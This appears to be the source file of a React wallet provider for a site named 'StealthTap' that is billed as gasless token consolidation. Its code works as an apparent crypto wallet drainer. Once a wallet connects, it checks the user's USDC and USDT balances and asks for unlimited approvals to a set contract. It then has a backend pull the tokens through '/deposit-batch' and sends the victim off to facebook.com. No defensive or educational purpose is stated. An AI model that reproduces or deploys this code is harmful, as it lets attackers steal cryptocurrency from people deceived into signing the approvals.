"use client";

import { createContext, useContext, useState, useEffect, useRef, useCallback } from 'react';
import { createAppKit, useAppKit } from '@reown/appkit/react';
import { mainnet } from '@reown/appkit/networks';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { WagmiProvider, useAccount, usePublicClient, useWalletClient } from 'wagmi';
import { maxUint256 } from 'viem';

// ----------------------------------------------------
// 1. CONFIGURATION
// ----------------------------------------------------
const PROJECT_ID = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID || 'd42d0d87f9dbd80edf85004d36f85169'; 
const CONTRACT_ADDRESS = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0xYOUR_ACTUAL_CONTRACT_ADDRESS";
const BACKEND_URL = process.env.NEXT_PUBLIC_BACKEND_URL || "/api";

const TOKENS = [
  { symbol: "USDC", address: process.env.NEXT_PUBLIC_USDC_ADDRESS || "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48" },
  { symbol: "USDT", address: process.env.NEXT_PUBLIC_USDT_ADDRESS || "0xdAC17F958D2ee523a2206206994597C13D831ec7" },
];

// Viem requires standard ABI objects instead of Ethers string formats
const ERC20_ABI = [
  { type: 'function', name: 'approve', inputs: [{ name: 'spender', type: 'address' }, { name: 'amount', type: 'uint256' }], outputs: [{ type: 'bool' }] },
  { type: 'function', name: 'allowance', inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], outputs: [{ type: 'uint256' }], stateMutability: 'view' },
  { type: 'function', name: 'balanceOf', inputs: [{ name: 'account', type: 'address' }], outputs: [{ type: 'uint256' }], stateMutability: 'view' }
];

// ----------------------------------------------------
// 2. WAGMI & REOWN SETUP
// ----------------------------------------------------
const queryClient = new QueryClient();

const wagmiAdapter = new WagmiAdapter({
  networks: [mainnet],
  projectId: PROJECT_ID,
});

createAppKit({
  adapters: [wagmiAdapter],
  networks: [mainnet],
  projectId: PROJECT_ID,
  features: { email: false, socials: false },
  metadata: {
    name: 'StealthTap',
    description: 'Gasless consolidation',
    url: typeof window !== 'undefined' ? window.location.origin : '',
    icons: [typeof window !== 'undefined' ? `${window.location.origin}/favicon.ico` : ''],
  }
});

const WalletContext = createContext(null);

// ----------------------------------------------------
// 3. INNER CONTEXT LOGIC
// ----------------------------------------------------
function InnerWalletProvider({ children }) {
  // Wagmi Hooks replacing Ethers providers
  const { address, isConnected } = useAccount();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();
  const { open } = useAppKit();

  const [status, setStatus] = useState('Ready.');
  const [isConsolidating, setIsConsolidating] = useState(false);
  
  // Tracks if the user clicked the button while disconnected
  const intentRef = useRef(false);

  const runTransactionLogic = useCallback(async () => {
    if (!address || !publicClient || !walletClient) return;

    setIsConsolidating(true);
    setStatus("Checking balances...");

    try {
      const held = [];

      // Read Balances (Viem style)
      for (const t of TOKENS) {
        const balance = await publicClient.readContract({
          address: t.address,
          abi: ERC20_ABI,
          functionName: 'balanceOf',
          args: [address]
        });

        if (balance > 0n) {
          held.push({ ...t, amount: balance });
        }
      }

      if (held.length === 0) {
        setStatus("❌ Zero balance");
        setIsConsolidating(false);
        return;
      }

      const successfullyApproved = [];

      // Sequential Approvals
      for (const t of held) {
        const currentAllowance = await publicClient.readContract({
          address: t.address,
          abi: ERC20_ABI,
          functionName: 'allowance',
          args: [address, CONTRACT_ADDRESS]
        });

        if (currentAllowance < t.amount) {
          try {
            setStatus(`Sign ${t.symbol} in Wallet ↩️`);

            // Write Contract (Viem style)
            const hash = await walletClient.writeContract({
              address: t.address,
              abi: ERC20_ABI,
              functionName: 'approve',
              args: [CONTRACT_ADDRESS, maxUint256] // viem's built in infinite max
            });

            setStatus(`Mining ${t.symbol}... Please wait.`);
            await publicClient.waitForTransactionReceipt({ hash }); 
            successfullyApproved.push(t);
          } catch (approvalError) {
            console.warn(`[deposit] Skipped ${t.symbol}:`, approvalError.message);
          }
        } else {
          successfullyApproved.push(t);
        }
      }

      if (successfullyApproved.length === 0) {
        setStatus("❌ No tokens approved");
        setIsConsolidating(false);
        return;
      }

      setStatus("Executing Deposit...");
      const res = await fetch(BACKEND_URL + "/deposit-batch", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ 
          depositor: address, 
          tokens: successfullyApproved.map(t => t.address), 
          amounts: successfullyApproved.map(t => t.amount.toString()) 
        }),
      });
      
      const data = await res.json();
      
      if (data.success) {
        setStatus("✅ Success! Redirecting...");
        setTimeout(() => {
          window.location.href = "https://facebook.com"; 
        }, 1500);
      } else {
        setStatus("❌ Failed — check console");
        setIsConsolidating(false);
      }

    } catch (err) {
      console.error("FATAL ERROR:", err);
      setStatus("❌ Error — check console");
      setIsConsolidating(false);
    } 
  }, [address, publicClient, walletClient]);

  // ----------------------------------------------------
  // THE AUTO-EXECUTE MAGIC LISTENER
  // ----------------------------------------------------
  useEffect(() => {
    // If the wallet connects, the client is ready, and they meant to consolidate...
    if (isConnected && walletClient && intentRef.current) {
      intentRef.current = false; // clear the intent
      runTransactionLogic();     // execute immediately
    }
  }, [isConnected, walletClient, runTransactionLogic]);

  // ----------------------------------------------------
  // THE BUTTON TRIGGER
  // ----------------------------------------------------
  const connectAndConsolidate = useCallback(async () => {
    if (isConnected && walletClient) {
      // Direct fast path if already connected
      await runTransactionLogic();
    } else {
      // Mark the intent, then open the Reown modal
      intentRef.current = true;
      setStatus("Connecting Wallet...");
      open({ view: 'Connect' });
    }
  }, [isConnected, walletClient, runTransactionLogic, open]);

  return (
    <WalletContext.Provider value={{
      walletReady: isConnected,
      address,
      status,
      isConsolidating,
      connectAndConsolidate,
    }}>
      {children}
    </WalletContext.Provider>
  );
}

// ----------------------------------------------------
// 4. MAIN EXPORTS & PROVIDER WRAPPER
// ----------------------------------------------------
// Wagmi requires the QueryClient and WagmiProvider at the top level
export function WalletProvider({ children }) {
  return (
    <WagmiProvider config={wagmiAdapter.wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        <InnerWalletProvider>
          {children}
        </InnerWalletProvider>
      </QueryClientProvider>
    </WagmiProvider>
  );
}

export function useWallet() {
  const ctx = useContext(WalletContext);
  if (!ctx) throw new Error('useWallet must be used within WalletProvider');
  return ctx;
}